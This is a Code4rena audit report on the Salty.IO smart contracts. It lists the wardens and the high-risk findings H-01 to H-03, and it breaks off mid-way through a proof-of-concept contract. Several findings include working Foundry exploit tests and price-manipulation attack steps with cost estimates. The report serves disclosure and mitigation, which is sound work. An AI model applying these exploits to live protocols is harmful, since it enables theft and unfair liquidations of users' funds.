---
sponsor: "Salty.IO"
slug: "2024-01-salty"
date: "2024-04-19"
title: "Salty.IO"
findings: "https://github.com/code-423n4/2024-01-salty-findings/issues"
contest: 320
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Salty.IO smart contract system written in Solidity. The audit took place between January 16—January 30 2024.

Following the C4 audit, 3 wardens, [0xpiken](https://code4rena.com/@0xpiken), [t0x1c](https://code4rena.com/@t0x1c), and [zzebra83](https://code4rena.com/@zzebra83) reviewed the mitigations for all identified issues; the [mitigation review report](#mitigation-review) is appended below the audit report.

## Wardens

180 Wardens contributed reports to Salty.IO:

  1. [0xpiken](https://code4rena.com/@0xpiken)
  2. [t0x1c](https://code4rena.com/@t0x1c)
  3. [handsomegiraffe](https://code4rena.com/@handsomegiraffe)
  4. [zzebra83](https://code4rena.com/@zzebra83)
  5. [0xRobocop](https://code4rena.com/@0xRobocop)
  6. [Banditx0x](https://code4rena.com/@Banditx0x)
  7. [klau5](https://code4rena.com/@klau5)
  8. [niroh](https://code4rena.com/@niroh)
  9. [oakcobalt](https://code4rena.com/@oakcobalt)
  10. [Bauchibred](https://code4rena.com/@Bauchibred)
  11. [fnanni](https://code4rena.com/@fnanni)
  12. [peanuts](https://code4rena.com/@peanuts)
  13. [ether\_sky](https://code4rena.com/@ether_sky)
  14. [0xAsen](https://code4rena.com/@0xAsen)
  15. [grearlake](https://code4rena.com/@grearlake)
  16. [Draiakoo](https://code4rena.com/@Draiakoo)
  17. [Toshii](https://code4rena.com/@Toshii)
  18. [J4X](https://code4rena.com/@J4X)
  19. [haxatron](https://code4rena.com/@haxatron)
  20. [israeladelaja](https://code4rena.com/@israeladelaja)
  21. [jasonxiale](https://code4rena.com/@jasonxiale)
  22. [0xCiphky](https://code4rena.com/@0xCiphky)
  23. [0x3b](https://code4rena.com/@0x3b)
  24. [zhaojie](https://code4rena.com/@zhaojie)
  25. [PENGUN](https://code4rena.com/@PENGUN)
  26. [0xMango](https://code4rena.com/@0xMango)
  27. [AgileJune](https://code4rena.com/@AgileJune)
  28. [vnavascues](https://code4rena.com/@vnavascues)
  29. [00xSEV](https://code4rena.com/@00xSEV)
  30. [stackachu](https://code4rena.com/@stackachu)
  31. [DedOhWale](https://code4rena.com/@DedOhWale)
  32. [ZanyBonzy](https://code4rena.com/@ZanyBonzy)
  33. [LinKenji](https://code4rena.com/@LinKenji)
  34. [OMEN](https://code4rena.com/@OMEN)
  35. [Arz](https://code4rena.com/@Arz)
  36. [0xGreyWolf](https://code4rena.com/@0xGreyWolf)
  37. [Audinarey](https://code4rena.com/@Audinarey)
  38. [DanielArmstrong](https://code4rena.com/@DanielArmstrong)
  39. [Giorgio](https://code4rena.com/@Giorgio)
  40. [VAD37](https://code4rena.com/@VAD37)
  41. [linmiaomiao](https://code4rena.com/@linmiaomiao)
  42. [BiasedMerc](https://code4rena.com/@BiasedMerc)
  43. [juancito](https://code4rena.com/@juancito)
  44. [lsaudit](https://code4rena.com/@lsaudit)
  45. [jesjupyter](https://code4rena.com/@jesjupyter)
  46. [0xVolcano](https://code4rena.com/@0xVolcano)
  47. [miaowu](https://code4rena.com/@miaowu)
  48. [Myrault](https://code4rena.com/@Myrault)
  49. [deepplus](https://code4rena.com/@deepplus)
  50. [KupiaSec](https://code4rena.com/@KupiaSec)
  51. [CongZhang-CertiK](https://code4rena.com/@CongZhang-CertiK)
  52. [n1punp](https://code4rena.com/@n1punp)
  53. [K42](https://code4rena.com/@K42)
  54. [dharma09](https://code4rena.com/@dharma09)
  55. [0x11singh99](https://code4rena.com/@0x11singh99)
  56. [0xAnah](https://code4rena.com/@0xAnah)
  57. [Jorgect](https://code4rena.com/@Jorgect)
  58. [falconhoof](https://code4rena.com/@falconhoof)
  59. [0xbepresent](https://code4rena.com/@0xbepresent)
  60. [RootKit0xCE](https://code4rena.com/@RootKit0xCE)
  61. [a3yip6](https://code4rena.com/@a3yip6)
  62. [inzinko](https://code4rena.com/@inzinko)
  63. [0xBinChook](https://code4rena.com/@0xBinChook)
  64. [b0g0](https://code4rena.com/@b0g0)
  65. [Tripathi](https://code4rena.com/@Tripathi)
  66. [cats](https://code4rena.com/@cats)
  67. [wangxx2026](https://code4rena.com/@wangxx2026)
  68. [IceBear](https://code4rena.com/@IceBear)
  69. [0xWaitress](https://code4rena.com/@0xWaitress)
  70. [djxploit](https://code4rena.com/@djxploit)
  71. [Topmark](https://code4rena.com/@Topmark)
  72. [Udsen](https://code4rena.com/@Udsen)
  73. [pina](https://code4rena.com/@pina)
  74. [aman](https://code4rena.com/@aman)
  75. [0xHelium](https://code4rena.com/@0xHelium)
  76. [twcctop](https://code4rena.com/@twcctop)
  77. [erosjohn](https://code4rena.com/@erosjohn)
  78. [Infect3d](https://code4rena.com/@Infect3d)
  79. [josephdara](https://code4rena.com/@josephdara)
  80. [Rhaydden](https://code4rena.com/@Rhaydden)
  81. [Silvermist](https://code4rena.com/@Silvermist)
  82. [Evo](https://code4rena.com/@Evo)
  83. [Stormreckson](https://code4rena.com/@Stormreckson)
  84. [nonseodion](https://code4rena.com/@nonseodion)
  85. [KingNFT](https://code4rena.com/@KingNFT)
  86. [Aymen0909](https://code4rena.com/@Aymen0909)
  87. [pkqs90](https://code4rena.com/@pkqs90)
  88. [forgebyola](https://code4rena.com/@forgebyola)
  89. [Kaysoft](https://code4rena.com/@Kaysoft)
  90. [0xSmartContractSamurai](https://code4rena.com/@0xSmartContractSamurai)
  91. [ayden](https://code4rena.com/@ayden)
  92. [7ashraf](https://code4rena.com/@7ashraf)
  93. [thekmj](https://code4rena.com/@thekmj)
  94. [Kalyan-Singh](https://code4rena.com/@Kalyan-Singh)
  95. [Ward](https://code4rena.com/@Ward) ([natzuu](https://code4rena.com/@natzuu) and [0xpessimist](https://code4rena.com/@0xpessimist))
  96. [hunter\_w3b](https://code4rena.com/@hunter_w3b)
  97. [santiellena](https://code4rena.com/@santiellena)
  98. [SpicyMeatball](https://code4rena.com/@SpicyMeatball)
  99. [Lalanda](https://code4rena.com/@Lalanda)
  100. [eeshenggoh](https://code4rena.com/@eeshenggoh)
  101. [0xanmol](https://code4rena.com/@0xanmol)
  102. [lanrebayode77](https://code4rena.com/@lanrebayode77)
  103. [Krace](https://code4rena.com/@Krace)
  104. [Hajime](https://code4rena.com/@Hajime)
  105. [0xmuxyz](https://code4rena.com/@0xmuxyz)
  106. [solmaxis69](https://code4rena.com/@solmaxis69) ([seeques](https://code4rena.com/@seeques) and [melihdhs](https://code4rena.com/@melihdhs))
  107. [0xfave](https://code4rena.com/@0xfave)
  108. [kinda\_very\_good](https://code4rena.com/@kinda_very_good)
  109. [fouzantanveer](https://code4rena.com/@fouzantanveer)
  110. [Sathish9098](https://code4rena.com/@Sathish9098)
  111. [hassanshakeel13](https://code4rena.com/@hassanshakeel13)
  112. [kaveyjoe](https://code4rena.com/@kaveyjoe)
  113. [yongskiws](https://code4rena.com/@yongskiws)
  114. [foxb868](https://code4rena.com/@foxb868)
  115. [0xepley](https://code4rena.com/@0xepley)
  116. [jauvany](https://code4rena.com/@jauvany)
  117. [catellatech](https://code4rena.com/@catellatech)
  118. [0xSmartContract](https://code4rena.com/@0xSmartContract)
  119. [rspadi](https://code4rena.com/@rspadi)
  120. [0xAlix2](https://code4rena.com/@0xAlix2) ([a\_kalout](https://code4rena.com/@a_kalout) and [ali\_shehab](https://code4rena.com/@ali_shehab))
  121. [zhaojohnson](https://code4rena.com/@zhaojohnson)
  122. [cu5t0mpeo](https://code4rena.com/@cu5t0mpeo)
  123. [zach](https://code4rena.com/@zach)
  124. [slvDev](https://code4rena.com/@slvDev)
  125. [sivanesh\_808](https://code4rena.com/@sivanesh_808)
  126. [Rolezn](https://code4rena.com/@Rolezn)
  127. [dutra](https://code4rena.com/@dutra)
  128. [ReadyPlayer2](https://code4rena.com/@ReadyPlayer2)
  129. [Matue](https://code4rena.com/@Matue)
  130. [piyushshukla](https://code4rena.com/@piyushshukla)
  131. [zhanmingjing](https://code4rena.com/@zhanmingjing)
  132. [n0kto](https://code4rena.com/@n0kto)
  133. [Beepidibop](https://code4rena.com/@Beepidibop)
  134. [chaduke](https://code4rena.com/@chaduke)
  135. [Drynooo](https://code4rena.com/@Drynooo)
  136. [Ephraim](https://code4rena.com/@Ephraim)
  137. [LeoGold](https://code4rena.com/@LeoGold)
  138. [naman1778](https://code4rena.com/@naman1778)
  139. [JCK](https://code4rena.com/@JCK)
  140. [unique](https://code4rena.com/@unique)
  141. [Raihan](https://code4rena.com/@Raihan)
  142. [JcFichtner](https://code4rena.com/@JcFichtner)
  143. [Pechenite](https://code4rena.com/@Pechenite) ([Bozho](https://code4rena.com/@Bozho) and [radev\_sw](https://code4rena.com/@radev_sw))
  144. [0xOmer](https://code4rena.com/@0xOmer)
  145. [The-Seraphs](https://code4rena.com/@The-Seraphs) ([pxng0lin](https://code4rena.com/@pxng0lin) and [solsaver](https://code4rena.com/@solsaver))
  146. [csanuragjain](https://code4rena.com/@csanuragjain)
  147. [codeslide](https://code4rena.com/@codeslide)
  148. [eta](https://code4rena.com/@eta)
  149. [Tigerfrake](https://code4rena.com/@Tigerfrake)
  150. [memforvik](https://code4rena.com/@memforvik)
  151. [neocrao](https://code4rena.com/@neocrao)
  152. [gkrastenov](https://code4rena.com/@gkrastenov)
  153. [lilizhu](https://code4rena.com/@lilizhu)
  154. [Limbooo](https://code4rena.com/@Limbooo)
  155. [0xPluto](https://code4rena.com/@0xPluto)
  156. [zxriptor](https://code4rena.com/@zxriptor)
  157. [y4y](https://code4rena.com/@y4y)
  158. [HALITUS](https://code4rena.com/@HALITUS)
  159. [okolicodes](https://code4rena.com/@okolicodes)
  160. [parrotAudits0](https://code4rena.com/@parrotAudits0)
  161. [agadzhalov](https://code4rena.com/@agadzhalov)
  162. [ewah](https://code4rena.com/@ewah)
  163. [MSaptarshi](https://code4rena.com/@MSaptarshi)
  164. [Imp](https://code4rena.com/@Imp)
  165. [rudolph](https://code4rena.com/@rudolph)
  166. [KHOROAMU](https://code4rena.com/@KHOROAMU)
  167. [c0pp3rscr3w3r](https://code4rena.com/@c0pp3rscr3w3r)
  168. [0xlemon](https://code4rena.com/@0xlemon)
  169. [novodelta](https://code4rena.com/@novodelta)
  170. [mussucal](https://code4rena.com/@mussucal)
  171. [CaeraDenoir](https://code4rena.com/@CaeraDenoir)
  172. [Auditwolf](https://code4rena.com/@Auditwolf)
  173. [holydevoti0n](https://code4rena.com/@holydevoti0n)
  174. [iamandreiski](https://code4rena.com/@iamandreiski)
  175. [developerjordy](https://code4rena.com/@developerjordy)

This audit was judged by [Picodes](https://code4rena.com/@picodes).

Final report assembled by PaperParachute.

# Summary

The C4 analysis yielded an aggregated total of 37 unique vulnerabilities. Of these vulnerabilities, 6 received a risk rating in the category of HIGH severity and 31 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 57 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 20 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Salty.IO repository](https://github.com/code-423n4/2024-01-salty), and is composed of 35 smart contracts written in the Solidity programming language and includes 3280 lines of Solidity code.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (6)
## [[H-01] Development Team might receive less SALT because there is no access control on `VestingWallet#release()`](https://github.com/code-423n4/2024-01-salty-findings/issues/712)
*Submitted by [0xpiken](https://github.com/code-423n4/2024-01-salty-findings/issues/712)*

The Development Team could potentially incur a loss on their SALT distribution reward due to the absence of access control on `VestingWallet#release()`.

### Proof of Concept

When Salty exchange is actived, 10M SALT will be transferred to `teamVestingWallet` by calling [`InitialDistribution#distributionApproved()`](https://github.com/code-423n4/2024-01-salty/blob/main/src/launch/InitialDistribution.sol#L50-L74):

```solidity
62: 	salt.safeTransfer( address(teamVestingWallet), 10 * MILLION_ETHER );
```

`teamVestingWallet` is responsible for distributing 10M SALT linely over 10 years ([Deployment.sol#L100](https://github.com/code-423n4/2024-01-salty/blob/main/src/dev/Deployment.sol#L100)):

```solidity
    teamVestingWallet = new VestingWallet( address(upkeep), uint64(block.timestamp), 60 * 60 * 24 * 365 * 10 );
```

From the above code we can see that the beneficiary of `teamVestingWallet` is `Upkeep`.

Each time [`Upkeep#performUpkeep()`](https://github.com/code-423n4/2024-01-salty/blob/main/src/Upkeep.sol#L244-L279) is called, `teamVestingWallet` will release a certain amount of SALT to `Upkeep`, the beneficiary, and then the relased SALT will be transferred to `mainWallet` of `managedTeamWallet`:

```solidity
  function step11() public onlySameContract
  {
    uint256 releaseableAmount = VestingWallet(payable(exchangeConfig.teamVestingWallet())).releasable(address(salt));
    
    // teamVestingWallet actually sends the vested SALT to this contract - which will then need to be sent to the active teamWallet
    VestingWallet(payable(exchangeConfig.teamVestingWallet())).release(address(salt));
    
    salt.safeTransfer( exchangeConfig.managedTeamWallet().mainWallet(), releaseableAmount );
  }
```

However, there is no access control on `teamVestingWallet.release()`. Any one can call `release()` to distribute SALT without informing `upkeep`. `upkeep` doesn't know how many SALT has been distributed in advance, it has no way to transfer it to the development team, and the distributed SALT by directly calling `teamVestingWallet.release()` will be locked in `upkeep` forever.

Copy below codes to [DAO.t.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/tests/DAO.t.sol) and run `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url RPC_URL --match-test testTeamRewardIsLockedInUpkeep`

```solidity
  function testTeamRewardIsLockedInUpkeep() public {
    uint releasableAmount = teamVestingWallet.releasable(address(salt));
    uint upKeepBalance = salt.balanceOf(address(upkeep));
    uint mainWalletBalance = salt.balanceOf(address(managedTeamWallet.mainWallet()));
    //@audit-info a certain amount of SALT is releasable
    assertTrue(releasableAmount != 0);
    //@audit-info there is no SALT in upkeep
    assertEq(upKeepBalance, 0);
    //@audit-info there is no SALT in mainWallet
    assertEq(mainWalletBalance, 0);
    //@audit-info call release() before performUpkeep()
    teamVestingWallet.release(address(salt));
    upkeep.performUpkeep();
    
    upKeepBalance = salt.balanceOf(address(upkeep));
    mainWalletBalance = salt.balanceOf(address(managedTeamWallet.mainWallet()));
    //@audit-info all released SALT is locked in upKeep
    assertEq(upKeepBalance, releasableAmount);
    //@audit-info development team receive nothing
    assertEq(mainWalletBalance, 0);
  }
```

### Recommended Mitigation Steps

*   Since `exchangeConfig.managedTeamWallet` is immutable, it is reasonable to config `managedTeamWallet` as the beneficiary when [deploying `teamVestingWallet`](https://github.com/code-423n4/2024-01-salty/blob/main/src/dev/Deployment.sol#L100):

```diff
-   teamVestingWallet = new VestingWallet( address(upkeep), uint64(block.timestamp), 60 * 60 * 24 * 365 * 10 );
+   teamVestingWallet = new VestingWallet( address(managedTeamWallet), uint64(block.timestamp), 60 * 60 * 24 * 365 * 10 );
```

*   Introduce a new function in `managedTeamWallet` to transfer all SALT balance to `mainWallet`:

```solidity
  function release(address token) external {
    uint balance = IERC20(token).balanceOf(address(this));
    if (balance != 0) {
      IERC20(token).safeTransfer(mainWallet, balance);
    }
  }
```

*   Call `managedTeamWallet#release()` in `Upkeep#performUpkeep()`:

```diff
  function step11() public onlySameContract
  {
-   uint256 releaseableAmount = VestingWallet(payable(exchangeConfig.teamVestingWallet())).releasable(address(salt));
    
-   // teamVestingWallet actually sends the vested SALT to this contract - which will then need to be sent to the active teamWallet
    VestingWallet(payable(exchangeConfig.teamVestingWallet())).release(address(salt));
    
-   salt.safeTransfer( exchangeConfig.managedTeamWallet().mainWallet(), releaseableAmount );
+   exchangeConfig.managedTeamWallet().release(address(salt));
  }
```
**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/712#issuecomment-1945532417):**
 > The ManagedWallet now the recipient of teamVestingWalletRewards to prevent the issue of DOS of the team rewards.
> 
> https://github.com/othernet-global/salty-io/commit/534d04a40c9b5821ad4e196095df70c0021d15ab

 > ManagedWallet has been removed.
> 
> https://github.com/othernet-global/salty-io/commit/5766592880737a5e682bb694a3a79e12926d48a5

**[Picodes (Judge) commented](https://github.com/code-423n4/2024-01-salty-findings/issues/712#issuecomment-1967449721):**
 > My initial view on this is that the issue is within `Upkeep` as it integrates poorly with the vesting wallet. It forgets that there is no access control, so I tend to see this as in scope.

 > The issue is not strictly in the deployment scripts, not strictly in the vesting wallet either because it makes sense to have no access control on `release`, so it must be in `Upkeep`.

_Note: For full discussion, see [here](https://github.com/code-423n4/2024-01-salty-findings/issues/712)._

**Status:** Mitigation confirmed. Full details in reports from [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/61), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/41), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/33).

***

## [[H-02] First Liquidity provider can claim all initial pool rewards](https://github.com/code-423n4/2024-01-salty-findings/issues/614)
*Submitted by [0xCiphky](https://github.com/code-423n4/2024-01-salty-findings/issues/614), also found by 0xCiphky ([1](https://github.com/code-423n4/2024-01-salty-findings/issues/603), [2](https://github.com/code-423n4/2024-01-salty-findings/issues/601)), [J4X](https://github.com/code-423n4/2024-01-salty-findings/issues/1057), [Toshii](https://github.com/code-423n4/2024-01-salty-findings/issues/1029), [stackachu](https://github.com/code-423n4/2024-01-salty-findings/issues/957), [Silvermist](https://github.com/code-423n4/2024-01-salty-findings/issues/948), [DedOhWale](https://github.com/code-423n4/2024-01-salty-findings/issues/923), [OMEN](https://github.com/code-423n4/2024-01-salty-findings/issues/896), [zhaojie](https://github.com/code-423n4/2024-01-salty-findings/issues/666), 0x3b ([1](https://github.com/code-423n4/2024-01-salty-findings/issues/661), [2](https://github.com/code-423n4/2024-01-salty-findings/issues/656), [3](https://github.com/code-423n4/2024-01-salty-findings/issues/498)), [ether\_sky](https://github.com/code-423n4/2024-01-salty-findings/issues/591), [Evo](https://github.com/code-423n4/2024-01-salty-findings/issues/543), [israeladelaja](https://github.com/code-423n4/2024-01-salty-findings/issues/535), RootKit0xCE ([1](https://github.com/code-423n4/2024-01-salty-findings/issues/433), [2](https://github.com/code-423n4/2024-01-salty-findings/issues/423)), [a3yip6](https://github.com/code-423n4/2024-01-salty-findings/issues/430), [Stormreckson](https://github.com/code-423n4/2024-01-salty-findings/issues/104), and [twcctop](https://github.com/code-423n4/2024-01-salty-findings/issues/370)*

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/StakingRewards.sol#L57> 

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/StakingRewards.sol#L147> 

<https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/StakingRewards.sol#L232>

Liquidity providers can add liquidity to the protocol using the depositCollateralAndIncreaseShare or depositLiquidityAndIncreaseShare functions, both functions call the \_increaseUserShare function to stake the users liquidity and account for the positions rewards. The current implementation has an issue, particularly in how it deals with the virtualRewards calculation for the first user. Since there is no current shares in the pool, then the virtualRewards calculation is skipped.

```solidity
// Increase a user's share for the given whitelisted pool.
    function _increaseUserShare(address wallet, bytes32 poolID, uint256 increaseShareAmount, bool useCooldown)
        internal
    {
        ...
	uint256 existingTotalShares = totalShares[poolID];

        if (
            existingTotalShares != 0 // prevent / 0
        ) {
            // Round up in favor of the protocol.
            uint256 virtualRewardsToAdd = Math.ceilDiv(totalRewards[poolID] * increaseShareAmount, existingTotalShares);

            user.virtualRewards += uint128(virtualRewardsToAdd);
            totalRewards[poolID] += uint128(virtualRewardsToAdd);
        }
        // Update the deposit balances
        user.userShare += uint128(increaseShareAmount);
        totalShares[poolID] = existingTotalShares + increaseShareAmount;
	...
    }
```

To understand the implications of this, we need to look at how a user's rewards are calculated. The formula used in the userRewardForPool function is:

*   **uint256 rewardsShare** **= (totalRewards\[poolID] \* user.userShare) / totalShares\[poolID];**

From this calculated rewardsShare, virtualRewards are then deducted:

*   **return rewardsShare - user.virtualRewards;**

In the case where the first user stakes in an empty pool, they end up having the same number of shares as the totalShares in the pool, but with zero virtualRewards. This means that the first user can claim all the pools rewards in the staking contract, as their share of rewards would not have the necessary deduction of virtualRewards.

```solidity
// Returns the user's pending rewards for a specified pool.
    function userRewardForPool(address wallet, bytes32 poolID) public view returns (uint256) {
        ...
        // Determine the share of the rewards for the user based on their deposited share
        uint256 rewardsShare = (totalRewards[poolID] * user.userShare) / totalShares[poolID];
	...
        return rewardsShare - user.virtualRewards;
    }
```

A potential issue is the **lack** of Initial Rewards in the Contract. Initially, the staking contract does not contain any rewards, meaning that if a user were to claim rewards immediately, they would receive nothing. To overcome this, the user needs to trigger the **upkeep** function. This function is responsible for transferring up to the maximum allowable daily rewards to the staking contract.

The **upkeep** contract employs a timer to regulate the frequency and quantity of rewards distribution. However, since this timer begins counting from the moment of the contract's deployment (in the constructor), and considering the initial voting period for starting up the exchange spans several days, it becomes feasible to distribute the maximum daily reward amount by invoking upkeep.

### Impact

A LP can exploit this vulnerability to claim all the current staking rewards in the contract. Initially, there are 555k SALT bootstrap rewards per pool in the stakingRewardsEmitter, which are emitted at a rate of 1% per day. As a result, the first LP could claim up to 5.5k SALT.

### Proof Of Concept

```solidity
function testFirstLPCanClaimAllRewards() public {
        assertEq(salt.balanceOf(alice), 0);
        bytes32 poolID1 = PoolUtils._poolID( wbtc, weth );
        bytes32[] memory poolIDs = new bytes32[](1);
        poolIDs[0] = poolID1;
        skip(2 days);
        // Total needs to be worth at least $2500
	uint256 depositedWBTC = ( 1000 ether *10**8) / priceAggregator.getPriceBTC();
	uint256 depositedWETH = ( 1000 ether *10**18) / priceAggregator.getPriceETH();
	(uint256 reserveWBTC, uint256 reserveWETH) = pools.getPoolReserves(wbtc, weth);
	vm.startPrank(alice);
        // Alice call upkeep
        upkeep.performUpkeep();
        // check total rewards for pool
        uint256[] memory totalRewards = new uint256[](1);
        totalRewards = collateralAndLiquidity.totalRewardsForPools(poolIDs);
        // Alice will deposit collateral 
	(uint256 addedAmountWBTC, uint256 addedAmountWETH, uint256 addedLiquidity) = collateralAndLiquidity.depositCollateralAndIncreaseShare( depositedWBTC, depositedWETH, 0, block.timestamp, false );
        // check alices rewards
        uint rewardsAlice = collateralAndLiquidity.userRewardForPool(alice, poolIDs[0]);
        collateralAndLiquidity.claimAllRewards(poolIDs);
        vm.stopPrank();

        assertEq(totalRewards[0], rewardsAlice);
        assertEq(salt.balanceOf(alice), totalRewards[0]);
    }
```

### Tools Used:

Foundry

### Recommendation:

The protocol can address this vulnerability in two ways:

*   Call the **performUpkeep** function just before the initial distribution. This resets the timer, ensuring that a very small amount of rewards is sent to the staking contract if called again.
*   Change the **lastUpkeepTime** to the start of when the exchange goes live, instead of in the constructor. This also ensures that only a minimal amount of rewards is sent to the staking contract upon subsequent calls, mitigating the problem.

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/614#issuecomment-1945502553):**
 > performUpkeep is now called at the start of BootstrapBallot.finalizeBallot to reset the emissions timers just before liquidity rewards claiming is started.
> 
> https://github.com/othernet-global/salty-io/commit/4f0c9c6a6e3e4234135ab7119a0e380af3e9776c

**Status:** Mitigation confirmed. Full details in reports from [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/42), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/62), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/32).


***

## [[H-03] The use of spot price by CoreSaltyFeed can lead to price manipulation and undesired liquidations](https://github.com/code-423n4/2024-01-salty-findings/issues/609)
*Submitted by [00xSEV](https://github.com/code-423n4/2024-01-salty-findings/issues/609), also found by [OMEN](https://github.com/code-423n4/2024-01-salty-findings/issues/938), [J4X](https://github.com/code-423n4/2024-01-salty-findings/issues/868), [miaowu](https://github.com/code-423n4/2024-01-salty-findings/issues/317), [Myrault](https://github.com/code-423n4/2024-01-salty-findings/issues/315), [Banditx0x](https://github.com/code-423n4/2024-01-salty-findings/issues/226), [linmiaomiao](https://github.com/code-423n4/2024-01-salty-findings/issues/181), [CongZhang-CertiK](https://github.com/code-423n4/2024-01-salty-findings/issues/67), [n1punp](https://github.com/code-423n4/2024-01-salty-findings/issues/30), and [jesjupyter](https://github.com/code-423n4/2024-01-salty-findings/issues/465)*

When the price moves, Chainlink instantly reports the spot price, while the TWAP slowly changes the price. The spot price of CoreSaltyFeed can be manipulated, allowing an attacker to move the price in a desired direction.

### Vulnerability Details

1.  The spot price of `CoreSaltyFeed` can be manipulated, even when considering automatic arbitrage. The cost of moving the price depends on the liquidity of the pools. While the protocol is small, it will be cheap to manipulate, but even as it grows, the cost won't become prohibitively expensive.
    If all the pools have `2*1_000` ETH of value each, the attack will cost only \~0.0036 ETH to move a price by 3%, and \~0.0363 ETH to move it by 10%.
    Refer to the PoCs for the estimated cost of the attack.

2.  Assume the WBTC/USD price moves 3%, from $40,000 to $38,800. Chainlink updates instantly, but the TWAP takes some time. You can see my calculations of the TWAP price change [here](https://docs.google.com/spreadsheets/d/e/2PACX-1vS_WU8z_MOikvCSnGjFLAFpVcOHcti2k82v0b8K4U3tNvXFuA61\_YedRqmQ6qgJaeiY1YnMulz5uauX/pubhtml).

3.  `CoreSaltyFeed` WBTC/USDS price will be adjusted to match Chainlink's price by arbitrageurs.

4.  `CoreSaltyFeed` returns $38,800, Chainlink returns $38,800, TWAP returns $40,000.

5.  The attacker moves the `CoreSaltyFeed` price \~3%, but less than the difference between TWAP and Chainlink, to $38,000.

6.  As shown in the PoC, it will cost the attacker only 0.0035 ETH if the pools have 1000 ETH of liquidity, but if they have 100 ETH, it will require only \~0.0004 ETH.

7.  The difference between `CoreSaltyFeed` and Chainlink is $800, and from TWAP and Chainlink it's $1,200.

8.  The [average price](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/price_feed/PriceAggregator.sol#L139) is set to ($38,000 + $38,800) / 2 = $38,400.

9.  Now the attacker can liquidate pools that should not be liquidatable because the price from PriceAggregator is lower than the real price. The attacker can do it first and get the rewards (5%, up to $500 by default). See the relevant code [here](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/CollateralAndLiquidity.sol#L171-L173).

    ```solidity
    // Reward the caller
    wbtc.safeTransfer( msg.sender, rewardedWBTC );
    weth.safeTransfer( msg.sender, rewardedWETH );
    ```

10. `maxRewardValueForCallingLiquidation` is set to $500. Depending on Salty's pool liquidity, ETH price, and how many positions an attacker can liquidate, profitability will vary. I argue that before the protocol gains traction, liquidity will be low for some time, making the attack profitable.

11. We should also consider that sometimes it will be profitable for the attacker to move the price slightly and be the first to call `liquidate` in order to receive the rewards.

12. Other liquidators, who don't use this attack, will not be able to liquidate, which is unfair.

Note: WBTC and WETH movements of 3% are common and will happen often. For example, about a month ago, there was a 6.5% drop in 20 minutes as reported by [Business Insider](https://markets.businessinsider.com/news/currencies/bitcoin-price-cryptocurrency-rally-crash-eth-btc-token-crypto-cpi-2023-12).

 **Variations**

1.  If the Chainlink oracle fails to update prices on time (due to block stuffing before the heartbeat or Chainlink DAO turning it off, as described [here](https://medium.com/hackernoon/the-anatomy-of-a-block-stuffing-attack-a488698732ae) and [here](https://medium.com/cyfrin/chainlink-oracle-defi-attacks-93b6cb6541bf#e100)), the attack becomes easier as a 3% price change in the market will not be necessary.
2.  In the event of a sudden crash in BTC and/or ETH, an attacker could mint undercollateralized USDS. The 200% collateral requirement, set in `StableConfig.initialCollateralRatioPercent` and calculated using the outdated TWAP price along with the manipulated `CoreSaltyFeed`, would be ineffective as protection against this attack when the real price has already dropped below 100%.
3.  During a sudden crash of BTC and/or ETH, [the oracle price feed may continue to report the incorrect minimum price](https://medium.com/cyfrin/chainlink-oracle-defi-attacks-93b6cb6541bf#00ac). This can again lead to the minting of undercollateralized USDS.

### Impact

1.  Positions that should not be liquidated are liquidated => unexpected liquidation and loss of part of collateral for a borrower (on fees)
2.  Honest liquidators who don't move the price won't be able to liquidate because an attacker will move the price and liquidate in the same transaction

### Proof of Concept

Put the code in `src/pools/tests/H2.t.sol`, run `COVERAGE="yes" forge test -f wss://ethereum-sepolia.publicnode.com -vvv --mc H2`

<details>

```solidity
// SPDX-License-Identifier: BUSL 1.1
pragma solidity =0.8.22;

import "../../dev/Deployment.sol";
import "../PoolUtils.sol";


contract H2 is Deployment
	{
    TestERC20 immutable tokenA;
    TestERC20 immutable tokenB;
    address ALICE = address(0x1111);
    address BOB = address(0x2222);

    	    constructor()
		{
            initializeContracts();

            grantAccessAlice();
            grantAccessBob();
            grantAccessCharlie();
            grantAccessDeployer();
            grantAccessDefault();

            finalizeBootstrap();

            vm.startPrank(address(daoVestingWallet));
            salt.transfer(DEPLOYER, 1000000 ether);
            salt.transfer(address(collateralAndLiquidity), 1000000 ether);
            vm.stopPrank();

            vm.startPrank( DEPLOYER );
            tokenA = new TestERC20("TOKENA", 18);
            tokenB = new TestERC20("TOKENB", 18);
            vm.stopPrank();
            _prepareToken(tokenA);
            _prepareToken(tokenB);
